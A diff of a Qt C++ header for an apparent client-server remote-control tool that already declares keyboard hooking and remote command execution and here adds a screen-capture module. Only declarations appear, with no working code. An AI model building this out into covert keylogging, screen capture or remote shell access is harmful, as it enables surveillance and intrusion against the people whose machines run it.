@@ -13,7 +13,9 @@
 #include <netclient.h>
 #include <keyboardmnt.h>
 #include <cmdmnt.h>
+#include <capturermnt.h>
 #include <cmdthread.h>
+#include <capturerthread.h>
 
 QT_BEGIN_NAMESPACE
 namespace Ui { class MainWindow; }
@@ -38,7 +40,8 @@ private slots:
     void on_clientConnect_clicked();
 
     void on_exctCMD(char* data);
-    void on_client_send_data(int, QString);
+
+    void on_capturerButton_clicked();
 
 private:
     NetServer* netServer;
@@ -46,15 +49,19 @@ private:
     KeyBoardMnt* keyBoardMnt;
     CMDMnt* cmdMnt;
     CMDThread* cmdThread;
+    CapturerMnt* capturerMnt;
+    CapturerThread* capturerThread;
 
 
     QLibrary* hookLib;
 
-    void dispatchClientData(common::UPacket* packet);
-    void dispatchServerData(common::UPacket* packet);
+    void dispatchClientData(common::packetType type, char* data);
+    void dispatchServerData(common::packetType type, char* data);
+    void on_client_send_data(int, QByteArray);
 
     void client_CMD(bool on_off);
     void client_KeyHook(bool on_off);
+    void client_Capture(bool on_off);
 protected:
     bool nativeEvent(const QByteArray &eventType, void *message, long *result);
 private:
